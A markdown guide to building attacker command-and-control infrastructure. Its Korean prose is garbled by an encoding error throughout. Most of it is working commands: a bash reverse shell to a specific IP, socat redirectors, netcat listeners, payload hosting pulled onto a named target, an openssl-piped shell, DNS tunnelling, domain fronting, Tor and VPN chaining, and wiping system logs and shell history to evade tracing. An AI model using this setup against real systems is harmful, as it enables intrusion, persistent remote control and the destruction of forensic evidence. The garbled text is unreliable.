# C2 ì¸í”„ë¼ í™œìš© ì™„ì „ ê°€ì´ë“œ

## ğŸ“‹ ëª©ì°¨

1. [C2 ì¸í”„ë¼ ê°œìš”](#c2-ì¸í”„ë¼-ê°œìš”)
2. [ì•„í‚¤í…ì²˜](#ì•„í‚¤í…ì²˜)
3. [ì„œë²„ ì„¤ì •](#ì„œë²„-ì„¤ì •)
4. [ì‚¬ìš© ë°©ë²•](#ì‚¬ìš©-ë°©ë²•)
5. [ê³ ê¸‰ ê¸°ë²•](#ê³ ê¸‰-ê¸°ë²•)
6. [ë³´ì•ˆ ë° ì€ë‹‰](#ë³´ì•ˆ-ë°-ì€ë‹‰)

---

## C2 ì¸í”„ë¼ ê°œìš”

### ì™œ C2 ì¸í”„ë¼ê°€ í•„ìš”í•œê°€?

**ë‹¨ìˆœ ê³µê²©ì˜ ë¬¸ì œì :**
```
ê³µê²©ì ë¡œì»¬ PC â†’ ëŒ€ìƒ ì„œë²„
```

- âœ— ê³µê²©ì ì‹¤ì œ IP ë…¸ì¶œ
- âœ— ë¡œê·¸ì— IP ê¸°ë¡ë¨
- âœ— ì¶”ì  ê°€ëŠ¥
- âœ— ë²•ì  ìœ„í—˜

**C2 ì¸í”„ë¼ ì‚¬ìš©:**
```
ê³µê²©ì ë¡œì»¬ â†’ ë¦¬ë‹¤ì´ë ‰í„° â†’ C2 ì„œë²„ â†’ ëŒ€ìƒ ì„œë²„
```

- âœ“ ê³µê²©ì ì‹¤ì œ IP ìˆ¨ê¹€
- âœ“ ë‹¤ì¸µ êµ¬ì¡°ë¡œ ì¶”ì  ì–´ë ¤ì›€
- âœ“ ì„œë²„ ì°¨ë‹¨ë˜ì–´ë„ ë‹¤ë¥¸ ì„œë²„ ì‚¬ìš© ê°€ëŠ¥
- âœ“ ì „ë¬¸ì ì¸ ë ˆë“œíŒ€ ìš´ì˜

### C2 ì¸í”„ë¼ êµ¬ì„± ìš”ì†Œ

#### 1. C2 ì„œë²„ (Command & Control)
- **ì—­í• :** ëª…ë ¹ ì œì–´ ì¤‘ì‹¬ ì„œë²„
- **ê¸°ëŠ¥:**
  - ë¦¬ë²„ìŠ¤ ì‰˜ ë¦¬ìŠ¤ë„ˆ
  - í˜ì´ë¡œë“œ í˜¸ìŠ¤íŒ…
  - ë°ì´í„° ìˆ˜ì§‘
  - ë°±ë„ì–´ ê´€ë¦¬

#### 2. ë¦¬ë‹¤ì´ë ‰í„° ì„œë²„ (Redirector)
- **ì—­í• :** íŠ¸ë˜í”½ ì¤‘ê³„ ì„œë²„
- **ê¸°ëŠ¥:**
  - IP ì£¼ì†Œ ìˆ¨ê¹€
  - C2 ì„œë²„ë¡œ íŠ¸ë˜í”½ í¬ì›Œë”©
  - ì—¬ëŸ¬ ê°œ ì‚¬ìš© ê°€ëŠ¥ (ì°¨ë‹¨ ëŒ€ë¹„)

#### 3. ì˜¤í¼ë ˆì´í„° ì„œë²„ (Operator)
- **ì—­í• :** ê³µê²©ìê°€ ì§ì ‘ ì‚¬ìš©í•˜ëŠ” ì„œë²„
- **ê¸°ëŠ¥:**
  - ê³µê²© ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰
  - ë¡œê·¸ ë¶„ì„
  - ë³´ê³ ì„œ ì‘ì„±

---

## ì•„í‚¤í…ì²˜

### ê¸°ë³¸ êµ¬ì¡°

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    C2 ì¸í”„ë¼ ì•„í‚¤í…ì²˜                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

[ê³µê²©ì ë¡œì»¬ PC]
       â†“ SSH ì ‘ì†
[ì˜¤í¼ë ˆì´í„° ì„œë²„] â† ê³µê²© ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰
       â†“ ëª…ë ¹ ì „ì†¡
[ë¦¬ë‹¤ì´ë ‰í„° ì„œë²„ 1] â† ëŒ€ìƒì´ ì—°ê²°í•˜ëŠ” IP
       â†“ í¬ì›Œë”©
[C2 ì„œë²„] â† ì‹¤ì œ ëª…ë ¹ ì œì–´
       â†‘ ë¦¬ë²„ìŠ¤ ì‰˜ ì—°ê²°
[ëŒ€ìƒ ì„œë²„] â† ê³µê²© ëŒ€ìƒ
```

### ê³ ê¸‰ êµ¬ì¡° (ë‹¤ì¤‘ ë¦¬ë‹¤ì´ë ‰í„°)

```
                    [ê³µê²©ì ë¡œì»¬]
                          â†“
                  [ì˜¤í¼ë ˆì´í„° ì„œë²„]
                    â†™    â†“    â†˜
         [ë¦¬ë‹¤ì´ë ‰í„° 1] [2] [3] â† ì—¬ëŸ¬ ê°œ ì‚¬ìš©
                    â†˜    â†“    â†™
                    [C2 ì„œë²„]
                          â†‘
                    [ëŒ€ìƒ ì„œë²„]
```

**ì¥ì :**
- ë¦¬ë‹¤ì´ë ‰í„° 1ê°œ ì°¨ë‹¨ë˜ì–´ë„ 2, 3 ì‚¬ìš© ê°€ëŠ¥
- ë¡œë“œ ë°¸ëŸ°ì‹±
- ì¶”ì  ì–´ë ¤ì›€

### ì‹¤ì œ ì˜ˆì‹œ

**ì‚¬ìš©ì í™˜ê²½:**
```
ì˜¤í¼ë ˆì´í„° ì„œë²„: 52.192.8.114
ë¦¬ë‹¤ì´ë ‰í„° ì„œë²„: 57.181.28.7
C2 ì„œë²„: (ì œê³µ ì˜ˆì •)
ëŒ€ìƒ ì„œë²„: 43.201.154.142
```

**íŠ¸ë˜í”½ í”Œë¡œìš°:**
```
ëŒ€ìƒ (43.201.154.142)
    â†“ ë¦¬ë²„ìŠ¤ ì‰˜: bash -i >& /dev/tcp/57.181.28.7/4444 0>&1
ë¦¬ë‹¤ì´ë ‰í„° (57.181.28.7:4444)
    â†“ socatìœ¼ë¡œ í¬ì›Œë”©
C2 ì„œë²„ (?:4444)
    â†“ nc -lvnp 4444 ë¦¬ìŠ¤ë„ˆ
ì˜¤í¼ë ˆì´í„° ì„œë²„ (52.192.8.114)
    â†“ SSH í„°ë„ë§
ê³µê²©ì ë¡œì»¬ PC
```

---

## ì„œë²„ ì„¤ì •

### 1. C2 ì„œë²„ ì„¤ì •

#### AWS EC2 ì¸ìŠ¤í„´ìŠ¤ ìƒì„±

```bash
# 1. AWS CLIë¡œ ì¸ìŠ¤í„´ìŠ¤ ìƒì„± (ë˜ëŠ” ì½˜ì†”)
aws ec2 run-instances \
    --image-id ami-0c55b159cbfafe1f0 \
    --instance-type t3.micro \
    --key-name my-key \
    --security-group-ids sg-xxxxxx \
    --subnet-id subnet-xxxxxx \
    --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=C2-Server}]'

# 2. ë³´ì•ˆ ê·¸ë£¹ ì„¤ì •
aws ec2 authorize-security-group-ingress \
    --group-id sg-xxxxxx \
    --protocol tcp \
    --port 4444 \
    --cidr 0.0.0.0/0  # ë˜ëŠ” ë¦¬ë‹¤ì´ë ‰í„° IPë§Œ

aws ec2 authorize-security-group-ingress \
    --group-id sg-xxxxxx \
    --protocol tcp \
    --port 22 \
    --cidr YOUR_IP/32  # SSH (ë³¸ì¸ IPë§Œ)
```

#### C2 ì„œë²„ ì´ˆê¸° ì„¤ì •

```bash
# SSH ì ‘ì†
ssh -i my-key.pem ubuntu@C2_IP

# ì—…ë°ì´íŠ¸
sudo apt update && sudo apt upgrade -y

# í•„ìˆ˜ ë„êµ¬ ì„¤ì¹˜
sudo apt install -y \
    netcat \
    socat \
    tmux \
    vim \
    python3 \
    python3-pip \
    git

# ë°©í™”ë²½ ì„¤ì •
sudo ufw allow 22/tcp    # SSH
sudo ufw allow 4444/tcp  # ë¦¬ë²„ìŠ¤ ì‰˜
sudo ufw allow 8000/tcp  # HTTP ì„œë²„
sudo ufw enable

# ë””ë ‰í† ë¦¬ êµ¬ì¡°
mkdir -p /opt/c2/{payloads,logs,data}
cd /opt/c2
```

#### ë¦¬ìŠ¤ë„ˆ ì„¤ì • (tmux ì‚¬ìš©)

```bash
# tmux ì„¸ì…˜ ì‹œì‘
tmux new -s c2

# ë¦¬ìŠ¤ë„ˆ ì‹¤í–‰
nc -lvnp 4444

# tmux ë‚˜ê°€ê¸° (ë°±ê·¸ë¼ìš´ë“œ ì‹¤í–‰)
# Ctrl+B, D

# ë‹¤ì‹œ ë“¤ì–´ê°€ê¸°
tmux attach -t c2
```

#### í˜ì´ë¡œë“œ í˜¸ìŠ¤íŒ…

```bash
# HTTP ì„œë²„ë¡œ í˜ì´ë¡œë“œ í˜¸ìŠ¤íŒ…
cd /opt/c2/payloads

# LinPEAS ë‹¤ìš´ë¡œë“œ
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# ê¶Œí•œ ìƒìŠ¹ ìŠ¤í¬ë¦½íŠ¸ (ê¸°ì¡´ ê²ƒ ë³µì‚¬)
# ...

# HTTP ì„œë²„ ì‹¤í–‰
python3 -m http.server 8000 &

# ëŒ€ìƒ ì„œë²„ì—ì„œ ë‹¤ìš´ë¡œë“œ:
# wget http://C2_IP:8000/linpeas.sh
```

### 2. ë¦¬ë‹¤ì´ë ‰í„° ì„œë²„ ì„¤ì •

#### ë¦¬ë‹¤ì´ë ‰í„° ì¸ìŠ¤í„´ìŠ¤ ìƒì„±

```bash
# AWS EC2 ì¸ìŠ¤í„´ìŠ¤ ìƒì„± (C2ì™€ ë™ì¼)
# ë³´ì•ˆ ê·¸ë£¹: TCP 4444 ì „ì²´ í—ˆìš© (0.0.0.0/0)
```

#### Socat ë¦¬ë‹¤ì´ë ‰ì…˜ ì„¤ì •

```bash
# SSH ì ‘ì†
ssh -i my-key.pem ubuntu@57.181.28.7

# Socat ì„¤ì¹˜
sudo apt update
sudo apt install -y socat

# í¬íŠ¸ í¬ì›Œë”© (4444 â†’ C2:4444)
socat TCP-LISTEN:4444,fork TCP:C2_IP:4444

# ë˜ëŠ” ë°±ê·¸ë¼ìš´ë“œ ì‹¤í–‰
nohup socat TCP-LISTEN:4444,fork TCP:C2_IP:4444 > /dev/null 2>&1 &

# í™•ì¸
netstat -tulnp | grep 4444
```

#### iptables ë¦¬ë‹¤ì´ë ‰ì…˜ (ëŒ€ì•ˆ)

```bash
# iptables ì‚¬ìš©
sudo iptables -t nat -A PREROUTING -p tcp --dport 4444 -j DNAT --to-destination C2_IP:4444
sudo iptables -t nat -A POSTROUTING -j MASQUERADE

# ì˜êµ¬ ì €ì¥
sudo apt install iptables-persistent
sudo netfilter-persistent save
```

#### ë‹¤ì¤‘ í¬íŠ¸ ë¦¬ë‹¤ì´ë ‰ì…˜

```bash
# ì—¬ëŸ¬ í¬íŠ¸ í¬ì›Œë”©
socat TCP-LISTEN:4444,fork TCP:C2_IP:4444 &  # ë¦¬ë²„ìŠ¤ ì‰˜
socat TCP-LISTEN:8000,fork TCP:C2_IP:8000 &  # HTTP ì„œë²„
socat TCP-LISTEN:443,fork TCP:C2_IP:443 &    # HTTPS (ì€ë‹‰)
```

### 3. ì˜¤í¼ë ˆì´í„° ì„œë²„ ì„¤ì •

#### ì„¤ì •

```bash
# SSH ì ‘ì†
ssh -i my-key.pem ubuntu@52.192.8.114

# ê³µê²© ë„êµ¬ ì„¤ì¹˜
sudo apt install -y \
    python3 \
    python3-pip \
    nmap \
    nikto \
    sqlmap \
    git

# Python íŒ¨í‚¤ì§€
pip3 install requests beautifulsoup4 pillow

# ë ˆí¬ì§€í† ë¦¬ í´ë¡  (ê³µê²© ìŠ¤í¬ë¦½íŠ¸)
git clone https://github.com/your-org/red-team-tools.git /opt/tools

# ë˜ëŠ” ì§ì ‘ ì—…ë¡œë“œ
scp -i my-key.pem defense_evasion_auto.py ubuntu@52.192.8.114:/opt/tools/
```

#### SSH í„°ë„ë§ ì„¤ì •

```bash
# ë¡œì»¬ PCì—ì„œ ì˜¤í¼ë ˆì´í„°ë¡œ í„°ë„
ssh -L 4444:C2_IP:4444 -i my-key.pem ubuntu@52.192.8.114

# ì´ì œ ë¡œì»¬ 4444 í¬íŠ¸ = C2 4444 í¬íŠ¸
nc -lvnp 4444  # ë¡œì»¬ì—ì„œ ë¦¬ìŠ¤ë„ˆ
```

---

## ì‚¬ìš© ë°©ë²•

### ì‹œë‚˜ë¦¬ì˜¤ 1: ê¸°ë³¸ C2 ì‚¬ìš©

#### ë‹¨ê³„ 1: C2 ì„œë²„ì—ì„œ ë¦¬ìŠ¤ë„ˆ ì‹œì‘

```bash
# C2 ì„œë²„ (SSH ì ‘ì†)
ssh -i my-key.pem ubuntu@C2_IP

# tmux ì„¸ì…˜
tmux new -s listener

# ë¦¬ìŠ¤ë„ˆ
nc -lvnp 4444
```

#### ë‹¨ê³„ 2: ë¦¬ë‹¤ì´ë ‰í„° ì„¤ì •

```bash
# ë¦¬ë‹¤ì´ë ‰í„° ì„œë²„
ssh -i my-key.pem ubuntu@57.181.28.7

# í¬ì›Œë”© (ì´ë¯¸ ì„¤ì •í–ˆìœ¼ë©´ skip)
socat TCP-LISTEN:4444,fork TCP:C2_IP:4444 &
```

#### ë‹¨ê³„ 3: ê³µê²© ì‹¤í–‰

```bash
# ì˜¤í¼ë ˆì´í„° ì„œë²„ ë˜ëŠ” ë¡œì»¬
python3 defense_evasion_auto.py 43.201.154.142 57.181.28.7 \
    --port 4444
```

#### ë‹¨ê³„ 4: ë¦¬ë²„ìŠ¤ ì‰˜ í™•ë³´

C2 ì„œë²„ì—ì„œ:
```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 43.201.154.142 52431

bash-4.2$ whoami
apache

bash-4.2$ hostname
target-server
```

### ì‹œë‚˜ë¦¬ì˜¤ 2: ë‹¤ì¤‘ ë¦¬ë‹¤ì´ë ‰í„° ì‚¬ìš©

#### ì„¤ì •

```bash
# ë¦¬ë‹¤ì´ë ‰í„° 1 (57.181.28.7)
socat TCP-LISTEN:4444,fork TCP:C2_IP:4444 &

# ë¦¬ë‹¤ì´ë ‰í„° 2 (ë‹¤ë¥¸ IP)
socat TCP-LISTEN:4444,fork TCP:C2_IP:4444 &

# ë¦¬ë‹¤ì´ë ‰í„° 3 (ë‹¤ë¥¸ IP)
socat TCP-LISTEN:4444,fork TCP:C2_IP:4444 &
```

#### ì‚¬ìš©

```bash
# ë¦¬ë‹¤ì´ë ‰í„° 1 ì‚¬ìš©
python3 defense_evasion_auto.py 43.201.154.142 57.181.28.7

# ë¦¬ë‹¤ì´ë ‰í„° 1 ì°¨ë‹¨ë˜ë©´ 2 ì‚¬ìš©
python3 defense_evasion_auto.py 43.201.154.142 REDIRECTOR2_IP

# 2ë„ ì°¨ë‹¨ë˜ë©´ 3 ì‚¬ìš©
python3 defense_evasion_auto.py 43.201.154.142 REDIRECTOR3_IP
```

### ì‹œë‚˜ë¦¬ì˜¤ 3: ë„ë©”ì¸ í”„ë¡ íŒ…

#### ê°œë…

```
ëŒ€ìƒ ì„œë²„ â†’ cloudfront.amazonaws.com (ì •ìƒ ë„ë©”ì¸)
    â†“ Host í—¤ë” ë³€ì¡°
ì‹¤ì œ C2 ì„œë²„
```

#### ì„¤ì •

```bash
# CloudFront ë°°í¬ ìƒì„±
# Origin: C2_IP
# CNAME: your-legit-domain.com

# ê³µê²© ìŠ¤í¬ë¦½íŠ¸ ìˆ˜ì •
# Host í—¤ë”ë¥¼ ì •ìƒ ë„ë©”ì¸ìœ¼ë¡œ
```

---

## ê³ ê¸‰ ê¸°ë²•

### 1. HTTPS ì•”í˜¸í™” í„°ë„

#### ê°œìš”
HTTPëŠ” í‰ë¬¸ì´ë¯€ë¡œ IDS/IPSì—ì„œ íƒì§€ ê°€ëŠ¥. HTTPS ì‚¬ìš©ìœ¼ë¡œ ì•”í˜¸í™”.

#### ì„¤ì •

```bash
# C2 ì„œë²„ì— SSL ì¸ì¦ì„œ ì„¤ì¹˜
sudo apt install certbot
sudo certbot certonly --standalone -d c2.yourdomain.com

# Nginx ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œ
sudo apt install nginx

# /etc/nginx/sites-available/c2
server {
    listen 443 ssl;
    server_name c2.yourdomain.com;

    ssl_certificate /etc/letsencrypt/live/c2.yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/c2.yourdomain.com/privkey.pem;

    location / {
        proxy_pass http://127.0.0.1:4444;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}

# í™œì„±í™”
sudo ln -s /etc/nginx/sites-available/c2 /etc/nginx/sites-enabled/
sudo systemctl restart nginx

# ë°©í™”ë²½
sudo ufw allow 443/tcp
```

#### ì‚¬ìš©

```bash
# OpenSSL ë¦¬ë²„ìŠ¤ ì‰˜
openssl s_client -connect c2.yourdomain.com:443 -quiet | /bin/bash 2>&1 | openssl s_client -connect c2.yourdomain.com:443 -quiet
```

### 2. DNS í„°ë„ë§

#### ê°œë…
HTTP/HTTPS ì°¨ë‹¨ë˜ì–´ë„ DNSëŠ” ê±°ì˜ í•­ìƒ í—ˆìš©ë¨. DNS ì¿¼ë¦¬ë¡œ ë°ì´í„° ì „ì†¡.

#### ë„êµ¬: dnscat2

```bash
# C2 ì„œë²„
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
gem install bundler
bundle install
ruby ./dnscat2.rb yourdomain.com

# ëŒ€ìƒ ì„œë²„
wget http://C2_IP:8000/dnscat
chmod +x dnscat
./dnscat --dns server=c2.yourdomain.com
```

### 3. ë‹¤ë‹¨ê³„ C2 (Nested C2)

#### êµ¬ì¡°

```
ê³µê²©ì â†’ C2-1 â†’ C2-2 â†’ C2-3 â†’ ëŒ€ìƒ
```

#### ì„¤ì •

```bash
# C2-1
socat TCP-LISTEN:4444,fork TCP:C2-2_IP:4444

# C2-2
socat TCP-LISTEN:4444,fork TCP:C2-3_IP:4444

# C2-3
nc -lvnp 4444
```

**íš¨ê³¼:** ì¶”ì  ê·¹ë„ë¡œ ì–´ë ¤ì›€

### 4. Malleable C2 í”„ë¡œíŒŒì¼ (Cobalt Strike)

Cobalt Strike ê°™ì€ ìƒìš© ë„êµ¬ ì‚¬ìš© ì‹œ íŠ¸ë˜í”½ì„ ì •ìƒ ì›¹ íŠ¸ë˜í”½ì²˜ëŸ¼ ìœ„ì¥.

```
GET /search?q=news HTTP/1.1
Host: www.google.com
User-Agent: Mozilla/5.0...

(ì‹¤ì œë¡œëŠ” C2 ëª…ë ¹ì–´ê°€ ìˆ¨ê²¨ì ¸ ìˆìŒ)
```

---

## ë³´ì•ˆ ë° ì€ë‹‰

### 1. ì„œë²„ í•˜ë“œë‹

#### C2 ì„œë²„ ë³´ì•ˆ

```bash
# 1. SSH í‚¤ ì¸ì¦ë§Œ í—ˆìš©
sudo vim /etc/ssh/sshd_config
# PasswordAuthentication no
# PubkeyAuthentication yes

sudo systemctl restart sshd

# 2. Fail2Ban ì„¤ì¹˜
sudo apt install fail2ban
sudo systemctl enable fail2ban

# 3. ë¶ˆí•„ìš”í•œ ì„œë¹„ìŠ¤ ë¹„í™œì„±í™”
sudo systemctl disable apache2
sudo systemctl disable mysql

# 4. ë°©í™”ë²½ ìµœì†Œ ê¶Œí•œ
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp from YOUR_IP
sudo ufw allow 4444/tcp from REDIRECTOR_IP
sudo ufw enable
```

### 2. ë¡œê·¸ ê´€ë¦¬

#### ê³µê²© ë¡œê·¸ ì•”í˜¸í™”

```bash
# ë¡œê·¸ íŒŒì¼ ì•”í˜¸í™”
cd /opt/c2/logs
tar -czf attack_$(date +%Y%m%d).tar.gz *.log
openssl enc -aes-256-cbc -salt -in attack_*.tar.gz -out attack_*.enc
rm -f attack_*.tar.gz *.log

# ë³µí˜¸í™”
openssl enc -d -aes-256-cbc -in attack_*.enc -out attack.tar.gz
tar -xzf attack.tar.gz
```

#### C2 ì„œë²„ ë¡œê·¸ ì‚­ì œ

```bash
# ì¹¨íˆ¬ í…ŒìŠ¤íŠ¸ ì¢…ë£Œ í›„
sudo bash -c 'echo "" > /var/log/auth.log'
sudo bash -c 'echo "" > /var/log/syslog'
history -c
rm -f ~/.bash_history
```

### 3. ìµëª…ì„± ê°•í™”

#### Tor ì‚¬ìš©

```bash
# C2 ì„œë²„ë¥¼ Tor Hidden Serviceë¡œ
sudo apt install tor

# /etc/tor/torrc
HiddenServiceDir /var/lib/tor/c2_service/
HiddenServicePort 4444 127.0.0.1:4444

sudo systemctl restart tor

# Onion ì£¼ì†Œ í™•ì¸
sudo cat /var/lib/tor/c2_service/hostname
# abc123.onion

# ì ‘ì†
torsocks nc -lvnp 4444
```

#### VPN ì²´ì¸

```
ê³µê²©ì â†’ VPN1 â†’ VPN2 â†’ VPN3 â†’ C2
```

```bash
# ë‹¤ì¤‘ VPN ì‚¬ìš©
sudo openvpn --config vpn1.ovpn &
# VPN1 ì—°ê²° í›„
sudo openvpn --config vpn2.ovpn &
# ...
```

### 4. ì„œë²„ íê¸°

í…ŒìŠ¤íŠ¸ ì¢…ë£Œ í›„:

```bash
# 1. ëª¨ë“  ë¡œê·¸ ì‚­ì œ
sudo bash /opt/c2/cleanup.sh

# 2. AWS ì¸ìŠ¤í„´ìŠ¤ ì¢…ë£Œ
aws ec2 terminate-instances --instance-ids i-xxxxxx

# ë˜ëŠ” ìŠ¤ëƒ…ìƒ· ì‚­ì œ í›„ ì¢…ë£Œ
aws ec2 delete-snapshot --snapshot-id snap-xxxxxx
```

---

## íŠ¸ëŸ¬ë¸”ìŠˆíŒ…

### ë¬¸ì œ 1: ë¦¬ë²„ìŠ¤ ì‰˜ ì—°ê²° ì•ˆë¨

**í™•ì¸:**

```bash
# 1. C2ì—ì„œ ë¦¬ìŠ¤ë„ˆ ì‹¤í–‰ ì¤‘ì¸ì§€
netstat -tulnp | grep 4444

# 2. ë¦¬ë‹¤ì´ë ‰í„° í¬ì›Œë”© ì‘ë™í•˜ëŠ”ì§€
# ë¦¬ë‹¤ì´ë ‰í„°ì—ì„œ
telnet C2_IP 4444

# 3. ë°©í™”ë²½ ë¬¸ì œ
# C2 ì„œë²„
sudo ufw status
sudo ufw allow 4444/tcp

# AWS ë³´ì•ˆ ê·¸ë£¹
# Inbound TCP 4444 í—ˆìš© í™•ì¸
```

### ë¬¸ì œ 2: Socat í¬ì›Œë”© ì•ˆë¨

**í™•ì¸:**

```bash
# Socat í”„ë¡œì„¸ìŠ¤ í™•ì¸
ps aux | grep socat

# ì¬ì‹œì‘
pkill socat
socat TCP-LISTEN:4444,fork TCP:C2_IP:4444 &

# ë¡œê·¸ í™•ì¸
socat -d -d TCP-LISTEN:4444,fork TCP:C2_IP:4444
```

### ë¬¸ì œ 3: SSH í„°ë„ ëŠê¹€

**í•´ê²°:**

```bash
# SSH keep-alive ì„¤ì •
# ~/.ssh/config
Host *
    ServerAliveInterval 60
    ServerAliveCountMax 3

# ì¬ì—°ê²° ìŠ¤í¬ë¦½íŠ¸
while true; do
    ssh -L 4444:C2_IP:4444 ubuntu@OPERATOR_IP
    sleep 5
done
```

---

## ì²´í¬ë¦¬ìŠ¤íŠ¸

### ë°°í¬ ì „

- [ ] C2 ì„œë²„ ì¸ìŠ¤í„´ìŠ¤ ìƒì„±
- [ ] ë¦¬ë‹¤ì´ë ‰í„° ì„œë²„ ì¸ìŠ¤í„´ìŠ¤ ìƒì„±
- [ ] ë³´ì•ˆ ê·¸ë£¹ ì„¤ì • (í¬íŠ¸ ì˜¤í”ˆ)
- [ ] SSH í‚¤ ì„¤ì •
- [ ] ë„êµ¬ ì„¤ì¹˜ (nc, socat, tmux ë“±)

### ê³µê²© ì¤‘

- [ ] C2 ë¦¬ìŠ¤ë„ˆ ì‹¤í–‰
- [ ] ë¦¬ë‹¤ì´ë ‰í„° í¬ì›Œë”© í™•ì¸
- [ ] í˜ì´ë¡œë“œ í˜¸ìŠ¤íŒ… (HTTP ì„œë²„)
- [ ] ë¦¬ë²„ìŠ¤ ì‰˜ ì—°ê²° í™•ì¸
- [ ] ë¡œê·¸ ì €ì¥

### ì¢…ë£Œ í›„

- [ ] ë¡œê·¸ ë°±ì—…
- [ ] ì„œë²„ ë¡œê·¸ ì‚­ì œ
- [ ] ë°±ë„ì–´ ì œê±° (ìŠ¹ì¸ëœ ê²½ìš°)
- [ ] ì¸ìŠ¤í„´ìŠ¤ ì¢…ë£Œ ë˜ëŠ” ìŠ¤ëƒ…ìƒ·
- [ ] ë³´ê³ ì„œ ì‘ì„±

---

## ë¹ ë¥¸ ì°¸ì¡°

### C2 ì„œë²„ ëª…ë ¹ì–´

```bash
# ë¦¬ìŠ¤ë„ˆ
tmux new -s c2
nc -lvnp 4444

# í˜ì´ë¡œë“œ í˜¸ìŠ¤íŒ…
cd /opt/c2/payloads
python3 -m http.server 8000 &

# ë¡œê·¸ í™•ì¸
tail -f /var/log/auth.log
```

### ë¦¬ë‹¤ì´ë ‰í„° ëª…ë ¹ì–´

```bash
# í¬ì›Œë”©
socat TCP-LISTEN:4444,fork TCP:C2_IP:4444 &

# í™•ì¸
netstat -tulnp | grep 4444
```

### ì˜¤í¼ë ˆì´í„° ëª…ë ¹ì–´

```bash
# ê³µê²© ì‹¤í–‰
python3 defense_evasion_auto.py TARGET_IP REDIRECTOR_IP

# SSH í„°ë„
ssh -L 4444:C2_IP:4444 ubuntu@OPERATOR_IP
```

---

**ì‘ì„±ì¼:** 2025-01-14
**ë²„ì „:** 1.0
**ëª©ì :** C2 ì¸í”„ë¼ êµ¬ì¶• ë° ê´€ë¦¬

**ì „ë¬¸ì ì¸ ë ˆë“œíŒ€ ìš´ì˜ì„ ìœ„í•œ í•„ìˆ˜ ê°€ì´ë“œ**
